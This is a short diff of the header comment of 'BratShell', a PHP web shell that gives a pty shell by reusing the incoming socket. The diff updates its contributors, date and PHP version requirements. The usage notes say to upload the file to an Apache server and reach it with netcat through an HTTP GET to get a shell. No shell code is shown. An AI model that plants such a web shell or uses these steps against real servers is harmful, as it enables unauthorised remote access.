@@ -6,12 +6,12 @@ GNU nano 2.5.3                                                File: /app/l1.php
 /**
  *    BratShell, findsock php stateful pty shell.
  *    Author: Brian Heese
- *    Contributors: Jeroen van Rijn, Richard Clifford, Marlon Etheredge
- *    Date: 05-08-2013
- *    Dependencies: PHP >= 5.3.6 - 5.3.14, PHP >= 5.4.0 - 5.4.4
+ *    Contributors: Jeroen van Rijn, Richard Clifford, Marlon Etheredge, Daniel Noel-Davies
+ *    Date: 03-4-2018
+ *    Dependencies: PHP >= 5.3.6
  *
  *    USAGE:
- *      1: Upload to Apache server running PHP >= 5.3.6 and PHP >= 5.4.0 - 5.4.4
+ *      1: Upload to Apache server running PHP >= 5.3.6
  *      2: nc -v [target hostname] 80
  *          GET /fd.php HTTP/1.0
  *
